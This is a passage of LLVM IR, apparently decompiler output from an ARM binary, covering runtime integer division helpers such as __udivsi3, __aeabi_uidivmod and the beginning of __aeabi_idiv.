  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_22500 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_22500, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_22500
  store i32 %tmp, i32* %arg1, align 4
  %v5_22500 = load i32, i32* %r0.global-to-local, align 4
  %v6_22500 = add i32 %v5_22500, -140552
  store i32 %v6_22500, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_22500, %bb
  %v5_22504 = phi i32 [ %tmp, %dec_label_pc_22500 ], [ %v6_22500, %bb ]
  ret i32 %v5_22504

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_22508 = load i32, i32* @r1, align 4
  %v1_22508 = add i32 %v0_22508, -1
  store i32 %v1_22508, i32* %r2.global-to-local, align 4
  %v2_22508 = icmp eq i32 %v0_22508, 0
  %v7_22508 = icmp eq i32 %v0_22508, 1
  %v0_2250c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_22508, i32 %v0_2250c)
  br i1 %v2_22508, label %dec_label_pc_225f0, label %dec_label_pc_22514

dec_label_pc_22514:                               ; preds = %entry
  %v0_22514 = load i32, i32* %r0.global-to-local, align 4
  %v1_22514 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_22514, %v1_22514
  br i1 %tmp, label %dec_label_pc_2251c, label %dec_label_pc_225a8

dec_label_pc_2251c:                               ; preds = %dec_label_pc_22514
  %v1_2251c = load i32, i32* %r2.global-to-local, align 4
  %v2_2251c = and i32 %v1_2251c, %v1_22514
  %v4_2251c = icmp eq i32 %v2_2251c, 0
  br i1 %v4_2251c, label %dec_label_pc_225b4, label %dec_label_pc_22524

dec_label_pc_22524:                               ; preds = %dec_label_pc_2251c
  %v3_22524 = icmp ult i32 %v1_22514, 536870912
  br i1 %v3_22524, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_22524
  %v4_22528 = mul i32 %v1_22514, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_22524, %.thread
  %v0_22548.pr36.ph = phi i32 [ %v4_22528, %.thread ], [ %v1_22514, %dec_label_pc_22524 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_22524 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_22548.pr36 = phi i32 [ %v4_2253c, %bb81 ], [ %v0_22548.pr36.ph, %.preheader.preheader ]
  %v1_22540 = phi i32 [ %v4_22540, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_22534 = icmp ugt i32 %v0_22548.pr36, 268435455
  br i1 %v2_22534, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_22548thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_22538 = icmp ult i32 %v0_22548.pr36, %v0_22514
  br i1 %v4_22538, label %bb80, label %dec_label_pc_22548thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_2253c = and i32 %v0_22548.pr36, 268435456
  %v3_2253c = icmp eq i32 %v2_2253c, 0
  %v4_2253c = mul i32 %v0_22548.pr36, 16
  br i1 %v3_2253c, label %bb81, label %dec_label_pc_22548.loopexit

bb81:                                             ; preds = %bb80
  %v2_22540 = and i32 %v1_22540, 268435456
  %v3_22540 = icmp eq i32 %v2_22540, 0
  %v4_22540 = mul i32 %v1_22540, 16
  br i1 %v3_22540, label %.preheader, label %dec_label_pc_22548thread-pre-split.loopexit.loopexit

dec_label_pc_22548thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_2255448.ph = phi i32 [ %v1_22540, %bb ], [ %v4_22540, %bb81 ]
  %v0_22548.pr38.ph = phi i32 [ %v0_22548.pr36, %bb ], [ %v4_2253c, %bb81 ]
  br label %dec_label_pc_22548thread-pre-split.loopexit

dec_label_pc_22548thread-pre-split.loopexit:      ; preds = %dec_label_pc_22548thread-pre-split.loopexit.loopexit, %.thread2
  %v1_2255448 = phi i32 [ %v1_22540, %.thread2 ], [ %v1_2255448.ph, %dec_label_pc_22548thread-pre-split.loopexit.loopexit ]
  %v0_22548.pr38 = phi i32 [ %v0_22548.pr36, %.thread2 ], [ %v0_22548.pr38.ph, %dec_label_pc_22548thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_22548thread-pre-split

dec_label_pc_22548thread-pre-split:               ; preds = %dec_label_pc_22548thread-pre-split.loopexit, %bb83
  %v1_2255446 = phi i32 [ %v1_2255448, %dec_label_pc_22548thread-pre-split.loopexit ], [ %v3_22554, %bb83 ]
  %v0_22548.pr = phi i32 [ %v0_22548.pr38, %dec_label_pc_22548thread-pre-split.loopexit ], [ %v3_22550, %bb83 ]
  br label %dec_label_pc_22548

dec_label_pc_22548.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_22548

dec_label_pc_22548:                               ; preds = %dec_label_pc_22548.loopexit, %dec_label_pc_22548thread-pre-split
  %v1_22554 = phi i32 [ %v1_2255446, %dec_label_pc_22548thread-pre-split ], [ %v1_22540, %dec_label_pc_22548.loopexit ]
  %v1_22550 = phi i32 [ %v0_22548.pr, %dec_label_pc_22548thread-pre-split ], [ %v4_2253c, %dec_label_pc_22548.loopexit ]
  %v2_22548 = icmp slt i32 %v1_22550, 0
  br i1 %v2_22548, label %dec_label_pc_2255c, label %bb82

bb82:                                             ; preds = %dec_label_pc_22548
  %v4_2254c = icmp ult i32 %v1_22550, %v0_22514
  br i1 %v4_2254c, label %bb83, label %dec_label_pc_2255c

bb83:                                             ; preds = %bb82
  %v3_22550 = mul i32 %v1_22550, 2
  %v2_22554 = icmp slt i32 %v1_22554, 0
  %v3_22554 = mul i32 %v1_22554, 2
  br i1 %v2_22554, label %dec_label_pc_2255c, label %dec_label_pc_22548thread-pre-split

dec_label_pc_2255c:                               ; preds = %bb82, %dec_label_pc_22548, %bb83
  %v2_2256859 = phi i32 [ %v3_22554, %bb83 ], [ %v1_22554, %bb82 ], [ %v1_22554, %dec_label_pc_22548 ]
  %v1_2256051 = phi i32 [ %v3_22550, %bb83 ], [ %v1_22550, %bb82 ], [ %v1_22550, %dec_label_pc_22548 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_22560

dec_label_pc_22560:                               ; preds = %.thread11, %dec_label_pc_2255c
  %v1_22594 = phi i32 [ %v4_22594, %.thread11 ], [ %v2_2256859, %dec_label_pc_2255c ]
  %v1_22568 = phi i32 [ %v0_225a0, %.thread11 ], [ 0, %dec_label_pc_2255c ]
  %v1_22598 = phi i32 [ %v4_22598, %.thread11 ], [ %v1_2256051, %dec_label_pc_2255c ]
  %v1_22564 = phi i32 [ %v0_22590, %.thread11 ], [ %v0_22514, %dec_label_pc_2255c ]
  %v3_22560 = icmp ult i32 %v1_22564, %v1_22598
  br i1 %v3_22560, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_22560
  %v3_22564 = sub i32 %v1_22564, %v1_22598
  store i32 %v3_22564, i32* %r0.global-to-local, align 4
  %v3_22568 = or i32 %v1_22568, %v1_22594
  store i32 %v3_22568, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_22560, %bb84
  %v1_22570 = phi i32 [ %v1_22564, %dec_label_pc_22560 ], [ %v3_22564, %bb84 ]
  %v1_22574 = phi i32 [ %v1_22568, %dec_label_pc_22560 ], [ %v3_22568, %bb84 ]
  %v4_2256c = udiv i32 %v1_22598, 2
  %v6_2256c = icmp ult i32 %v1_22570, %v4_2256c
  br i1 %v6_2256c, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_22570 = urem i32 %v1_22598, 2
  %v4_22570 = icmp eq i32 %v3_22570, 0
  %v6_22570 = sub i32 %v1_22570, %v4_2256c
  store i32 %v6_22570, i32* %r0.global-to-local, align 4
  br i1 %v4_22570, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_22574 = udiv i32 %v1_22594, 2
  %v6_22574 = or i32 %v1_22574, %v5_22574
  store i32 %v6_22574, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_2257c = phi i32 [ %v6_22570, %bb85 ], [ %v1_22570, %.thread7 ], [ %v6_22570, %bb86 ]
  %v1_22580 = phi i32 [ %v1_22574, %bb85 ], [ %v1_22574, %.thread7 ], [ %v6_22574, %bb86 ]
  %v4_22578 = udiv i32 %v1_22598, 4
  %v6_22578 = icmp ult i32 %v1_2257c, %v4_22578
  br i1 %v6_22578, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_2257c = and i32 %v1_22598, 2
  %v4_2257c = icmp eq i32 %v3_2257c, 0
  %v6_2257c = sub i32 %v1_2257c, %v4_22578
  store i32 %v6_2257c, i32* %r0.global-to-local, align 4
  br i1 %v4_2257c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_22580 = udiv i32 %v1_22594, 4
  %v6_22580 = or i32 %v1_22580, %v5_22580
  store i32 %v6_22580, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_22588 = phi i32 [ %v6_2257c, %bb87 ], [ %v1_2257c, %.thread8 ], [ %v6_2257c, %bb88 ]
  %v1_2258c = phi i32 [ %v1_22580, %bb87 ], [ %v1_22580, %.thread8 ], [ %v6_22580, %bb88 ]
  %v4_22584 = udiv i32 %v1_22598, 8
  %v6_22584 = icmp ult i32 %v1_22588, %v4_22584
  br i1 %v6_22584, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_22588 = and i32 %v1_22598, 4
  %v4_22588 = icmp eq i32 %v3_22588, 0
  %v6_22588 = sub i32 %v1_22588, %v4_22584
  store i32 %v6_22588, i32* %r0.global-to-local, align 4
  br i1 %v4_22588, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_2258c = udiv i32 %v1_22594, 8
  %v6_2258c = or i32 %v1_2258c, %v5_2258c
  store i32 %v6_2258c, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_225a0 = phi i32 [ %v1_2258c, %bb89 ], [ %v1_2258c, %.thread9 ], [ %v6_2258c, %bb90 ]
  %v0_22590 = phi i32 [ %v6_22588, %bb89 ], [ %v1_22588, %.thread9 ], [ %v6_22588, %bb90 ]
  %v2_22590 = icmp eq i32 %v0_22590, 0
  br i1 %v2_22590, label %dec_label_pc_225a0, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_22594, 16
  br i1 %tmp138, label %dec_label_pc_225a0, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_22594 = udiv i32 %v1_22594, 16
  %v4_22598 = udiv i32 %v1_22598, 16
  br label %dec_label_pc_22560

dec_label_pc_225a0:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_225a0, i32* %r0.global-to-local, align 4
  ret i32 %v0_225a0

dec_label_pc_225a8:                               ; preds = %dec_label_pc_22514
  %v9_22514 = icmp eq i32 %v0_22514, %v1_22514
  %. = zext i1 %v9_22514 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_225b4:                               ; preds = %dec_label_pc_2251c
  %v2_225b4 = icmp ugt i32 %v1_22514, 65535
  br i1 %v2_225b4, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_225b4
  %v2_225b8 = and i32 %v1_22514, 32768
  %v3_225b8 = icmp eq i32 %v2_225b8, 0
  %v4_225b8 = udiv i32 %v1_22514, 65536
  br i1 %v3_225b8, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_225b4
  %v0_225c465 = phi i32 [ %v1_22514, %dec_label_pc_225b4 ], [ %v4_225b8, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_225c8 = phi i32 [ %v0_225c465, %.thread16 ], [ %v4_225b8, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_225c4 = icmp ugt i32 %v1_225c8, 255
  br i1 %v2_225c4, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_225c8 = and i32 %v1_225c8, 128
  %v3_225c8 = icmp eq i32 %v2_225c8, 0
  %v4_225c8 = udiv i32 %v1_225c8, 256
  br i1 %v3_225c8, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_225cc = or i32 %storemerge, 8
  store i32 %v2_225cc, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_225d8 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_225cc, %bb98 ]
  %v1_225d4 = phi i32 [ %v1_225c8, %bb96 ], [ %v4_225c8, %bb97 ], [ %v4_225c8, %bb98 ]
  %v2_225d0 = icmp ugt i32 %v1_225d4, 15
  br i1 %v2_225d0, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_225d4 = and i32 %v1_225d4, 8
  %v3_225d4 = icmp eq i32 %v2_225d4, 0
  %v4_225d4 = udiv i32 %v1_225d4, 16
  br i1 %v3_225d4, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_225d8 = add nsw i32 %v1_225d8, 4
  store i32 %v2_225d8, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_225e0 = phi i32 [ %v1_225d8, %.thread17 ], [ %v1_225d8, %bb99 ], [ %v2_225d8, %bb100 ]
  %v5_225e4 = phi i32 [ %v1_225d4, %.thread17 ], [ %v4_225d4, %bb99 ], [ %v4_225d4, %bb100 ]
  %v2_225dc = icmp ugt i32 %v5_225e4, 3
  %v7_225dc = icmp eq i32 %v5_225e4, 4
  %v2_225e0 = xor i1 %v7_225dc, true
  %v3_225e0 = and i1 %v2_225dc, %v2_225e0
  br i1 %v3_225e0, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_225e0 = add nsw i32 %v4_225e0, 3
  store i32 %v5_225e0, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_225e4 = phi i32 [ %v4_225e0, %.thread18 ], [ %v5_225e0, %bb101 ]
  %v2_225e4 = xor i1 %v2_225dc, true
  %v3_225e4 = or i1 %v7_225dc, %v2_225e4
  br i1 %v3_225e4, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_225e4 = udiv i32 %v5_225e4, 2
  %v9_225e4 = add i32 %v4_225e4, %v8_225e4
  store i32 %v9_225e4, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_225e8 = phi i32 [ %v4_225e4, %bb102 ], [ %v9_225e4, %bb103 ]
  %v6_225e8 = lshr i32 %v0_22514, %v1_225e8
  store i32 %v6_225e8, i32* %r0.global-to-local, align 4
  ret i32 %v6_225e8

dec_label_pc_225f0:                               ; preds = %entry
  %v0_225f4 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_225e4, { 1, 0 }
  uselistorder i1 %v7_225dc, { 1, 0 }
  uselistorder i32 %v4_225d4, { 1, 0 }
  uselistorder i32 %v1_225d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_225cc, { 1, 0 }
  uselistorder i32 %v4_225c8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_225c8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_225b8, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_22590, { 1, 0 }
  uselistorder i32 %v0_225a0, { 1, 0, 2 }
  uselistorder i32 %v4_22584, { 1, 0 }
  uselistorder i32 %v1_2258c, { 1, 2, 0 }
  uselistorder i32 %v4_22578, { 1, 0 }
  uselistorder i32 %v1_22580, { 1, 2, 0 }
  uselistorder i32 %v4_2256c, { 1, 0 }
  uselistorder i32 %v1_22574, { 1, 2, 0 }
  uselistorder i32 %v1_22598, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_22568, { 1, 0 }
  uselistorder i32 %v1_22594, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_22554, { 1, 0 }
  uselistorder i32 %v3_22550, { 1, 0 }
  uselistorder i32 %v1_22550, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_22554, { 1, 2, 0, 3 }
  uselistorder i32 %v4_22540, { 1, 0 }
  uselistorder i32 %v4_2253c, { 2, 1, 0 }
  uselistorder i32 %v1_22540, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_22548.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_22514, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_22514, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_22508, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_225a0, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_2255c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22548thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_22608 = udiv i32 %arg1, %arg2
  ret i32 %v2_22608
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_2261c = load i32, i32* @r1, align 4
  %v1_2261c = icmp slt i32 %v0_2261c, 0
  %v2_2261c = icmp eq i32 %v0_2261c, 0
  %v2_22620 = xor i32 %v0_2261c, %arg1
  br i1 %v2_2261c, label %dec_label_pc_22734, label %dec_label_pc_22628

dec_label_pc_22628:                               ; preds = %entry
  br i1 %v1_2261c, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_22628
  %v2_22628 = sub i32 0, %v0_2261c
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_22628, %bb
  %v1_226f4 = phi i32 [ %v2_22628, %bb ], [ %v0_2261c, %dec_label_pc_22628 ]
  %v1_2262c = add i32 %v1_226f4, -1
  %v7_2262c = icmp eq i32 %v1_226f4, 1
  br i1 %v7_2262c, label %dec_label_pc_226d4, label %dec_label_pc_22634

dec_label_pc_22634:                               ; preds = %thread-pre-split
  %v1_22634 = icmp slt i32 %arg1, 0
  br i1 %v1_22634, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_22634
  %v2_22638 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_22634, %bb85
  %v0_22728 = phi i32 [ %arg1, %dec_label_pc_22634 ], [ %v2_22638, %bb85 ]
  %v3_2263c = icmp uge i32 %v0_22728, %v1_226f4
  %v9_2263c = icmp eq i32 %v0_22728, %v1_226f4
  %v2_22640 = xor i1 %v3_2263c, true
  %v3_22640 = or i1 %v9_2263c, %v2_22640
  br i1 %v3_22640, label %dec_label_pc_226e0, label %dec_label_pc_22644

dec_label_pc_22644:                               ; preds = %bb86
  %v2_22644 = and i32 %v1_2262c, %v1_226f4
  %v4_22644 = icmp eq i32 %v2_22644, 0
  br i1 %v4_22644, label %dec_label_pc_226f0, label %dec_label_pc_2264c

dec_label_pc_2264c:                               ; preds = %dec_label_pc_22644
  %v3_2264c = icmp ult i32 %v1_226f4, 536870912
  br i1 %v3_2264c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_2264c
  %v4_22650 = mul i32 %v1_226f4, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_2264c, %.thread
  %v0_22670.pr40.ph = phi i32 [ %v4_22650, %.thread ], [ %v1_226f4, %dec_label_pc_2264c ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_2264c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_22670.pr40 = phi i32 [ %v4_22664, %bb89 ], [ %v0_22670.pr40.ph, %.preheader.preheader ]
  %v1_22668 = phi i32 [ %v4_22668, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_2265c = icmp ugt i32 %v0_22670.pr40, 268435455
  br i1 %v2_2265c, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_22670thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_22660 = icmp ult i32 %v0_22670.pr40, %v0_22728
  br i1 %v4_22660, label %bb88, label %dec_label_pc_22670thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_22664 = and i32 %v0_22670.pr40, 268435456
  %v3_22664 = icmp eq i32 %v2_22664, 0
  %v4_22664 = mul i32 %v0_22670.pr40, 16
  br i1 %v3_22664, label %bb89, label %dec_label_pc_22670.loopexit

bb89:                                             ; preds = %bb88
  %v2_22668 = and i32 %v1_22668, 268435456
  %v3_22668 = icmp eq i32 %v2_22668, 0
  %v4_22668 = mul i32 %v1_22668, 16
  br i1 %v3_22668, label %.preheader, label %dec_label_pc_22670thread-pre-split.loopexit.loopexit

dec_label_pc_22670thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_2267c52.ph = phi i32 [ %v1_22668, %bb87 ], [ %v4_22668, %bb89 ]
  %v0_22670.pr42.ph = phi i32 [ %v0_22670.pr40, %bb87 ], [ %v4_22664, %bb89 ]
  br label %dec_label_pc_22670thread-pre-split.loopexit

dec_label_pc_22670thread-pre-split.loopexit:      ; preds = %dec_label_pc_22670thread-pre-split.loopexit.loopexit, %.thread3
  %v1_2267c52 = phi i32 [ %v1_22668, %.thread3 ], [ %v1_2267c52.ph, %dec_label_pc_22670thread-pre-split.loopexit.loopexit ]
  %v0_22670.pr42 = phi i32 [ %v0_22670.pr40, %.thread3 ], [ %v0_22670.pr42.ph, %dec_label_pc_22670thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_22670thread-pre-split

dec_label_pc_22670thread-pre-split:               ; preds = %dec_label_pc_22670thread-pre-split.loopexit, %bb91
  %v1_2267c50 = phi i32 [ %v1_2267c52, %dec_label_pc_22670thread-pre-split.loopexit ], [ %v3_2267c, %bb91 ]
  %v2_2267448 = phi i32 [ %v0_22728, %dec_label_pc_22670thread-pre-split.loopexit ], [ %v2_22674, %bb91 ]
  %v0_22670.pr = phi i32 [ %v0_22670.pr42, %dec_label_pc_22670thread-pre-split.loopexit ], [ %v3_22678, %bb91 ]
  br label %dec_label_pc_22670

dec_label_pc_22670.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_22670

dec_label_pc_22670:                               ; preds = %dec_label_pc_22670.loopexit, %dec_label_pc_22670thread-pre-split
  %v1_2267c = phi i32 [ %v1_2267c50, %dec_label_pc_22670thread-pre-split ], [ %v1_22668, %dec_label_pc_22670.loopexit ]
  %v2_22674 = phi i32 [ %v2_2267448, %dec_label_pc_22670thread-pre-split ], [ %v0_22728, %dec_label_pc_22670.loopexit ]
  %v1_22678 = phi i32 [ %v0_22670.pr, %dec_label_pc_22670thread-pre-split ], [ %v4_22664, %dec_label_pc_22670.loopexit ]
  %v2_22670 = icmp slt i32 %v1_22678, 0
  br i1 %v2_22670, label %dec_label_pc_22684, label %bb90

bb90:                                             ; preds = %dec_label_pc_22670
  %v4_22674 = icmp ult i32 %v1_22678, %v2_22674
  br i1 %v4_22674, label %bb91, label %dec_label_pc_22684

bb91:                                             ; preds = %bb90
  %v3_22678 = mul i32 %v1_22678, 2
  %v2_2267c = icmp slt i32 %v1_2267c, 0
  %v3_2267c = mul i32 %v1_2267c, 2
  br i1 %v2_2267c, label %dec_label_pc_22684, label %dec_label_pc_22670thread-pre-split

dec_label_pc_22684:                               ; preds = %bb90, %dec_label_pc_22670, %bb91
  %v2_2269063 = phi i32 [ %v3_2267c, %bb91 ], [ %v1_2267c, %bb90 ], [ %v1_2267c, %dec_label_pc_22670 ]
  %v1_2268855 = phi i32 [ %v3_22678, %bb91 ], [ %v1_22678, %bb90 ], [ %v1_22678, %dec_label_pc_22670 ]
  br label %dec_label_pc_22688

dec_label_pc_22688:                               ; preds = %.thread13, %dec_label_pc_22684
  %v1_226bc = phi i32 [ %v4_226bc, %.thread13 ], [ %v2_2269063, %dec_label_pc_22684 ]
  %v1_22690 = phi i32 [ %v1_226cc, %.thread13 ], [ 0, %dec_label_pc_22684 ]
  %v1_226c0 = phi i32 [ %v4_226c0, %.thread13 ], [ %v1_2268855, %dec_label_pc_22684 ]
  %v1_2268c = phi i32 [ %v0_226b8, %.thread13 ], [ %v0_22728, %dec_label_pc_22684 ]
  %v3_22688 = icmp ult i32 %v1_2268c, %v1_226c0
  br i1 %v3_22688, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_22688
  %v3_2268c = sub i32 %v1_2268c, %v1_226c0
  %v3_22690 = or i32 %v1_22690, %v1_226bc
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_22688, %bb92
  %v1_22698 = phi i32 [ %v1_2268c, %dec_label_pc_22688 ], [ %v3_2268c, %bb92 ]
  %v1_2269c = phi i32 [ %v1_22690, %dec_label_pc_22688 ], [ %v3_22690, %bb92 ]
  %v4_22694 = udiv i32 %v1_226c0, 2
  %v6_22694 = icmp ult i32 %v1_22698, %v4_22694
  br i1 %v6_22694, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_22698 = urem i32 %v1_226c0, 2
  %v4_22698 = icmp eq i32 %v3_22698, 0
  %v6_22698 = sub i32 %v1_22698, %v4_22694
  br i1 %v4_22698, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_2269c = udiv i32 %v1_226bc, 2
  %v6_2269c = or i32 %v1_2269c, %v5_2269c
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_226a4 = phi i32 [ %v6_22698, %bb93 ], [ %v1_22698, %.thread8 ], [ %v6_22698, %bb94 ]
  %v1_226a8 = phi i32 [ %v1_2269c, %bb93 ], [ %v1_2269c, %.thread8 ], [ %v6_2269c, %bb94 ]
  %v4_226a0 = udiv i32 %v1_226c0, 4
  %v6_226a0 = icmp ult i32 %v1_226a4, %v4_226a0
  br i1 %v6_226a0, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_226a4 = and i32 %v1_226c0, 2
  %v4_226a4 = icmp eq i32 %v3_226a4, 0
  %v6_226a4 = sub i32 %v1_226a4, %v4_226a0
  br i1 %v4_226a4, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_226a8 = udiv i32 %v1_226bc, 4
  %v6_226a8 = or i32 %v1_226a8, %v5_226a8
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_226b0 = phi i32 [ %v6_226a4, %bb95 ], [ %v1_226a4, %.thread9 ], [ %v6_226a4, %bb96 ]
  %v1_226b4 = phi i32 [ %v1_226a8, %bb95 ], [ %v1_226a8, %.thread9 ], [ %v6_226a8, %bb96 ]
  %v4_226ac = udiv i32 %v1_226c0, 8
  %v6_226ac = icmp ult i32 %v1_226b0, %v4_226ac
  br i1 %v6_226ac, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_226b0 = and i32 %v1_226c0, 4
  %v4_226b0 = icmp eq i32 %v3_226b0, 0
  %v6_226b0 = sub i32 %v1_226b0, %v4_226ac
  br i1 %v4_226b0, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_226b4 = udiv i32 %v1_226bc, 8
  %v6_226b4 = or i32 %v1_226b4, %v5_226b4
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_226cc = phi i32 [ %v1_226b4, %bb97 ], [ %v1_226b4, %.thread10 ], [ %v6_226b4, %bb98 ]
  %v0_226b8 = phi i32 [ %v6_226b0, %bb97 ], [ %v1_226b0, %.thread10 ], [ %v6_226b0, %bb98 ]
  %v2_226b8 = icmp eq i32 %v0_226b8, 0
  br i1 %v2_226b8, label %dec_label_pc_226c8, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_226bc, 16
  br i1 %tmp, label %dec_label_pc_226c8, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_226bc = udiv i32 %v1_226bc, 16
  %v4_226c0 = udiv i32 %v1_226c0, 16
  br label %dec_label_pc_22688

dec_label_pc_226c8:                               ; preds = %thread-pre-split12, %bb99
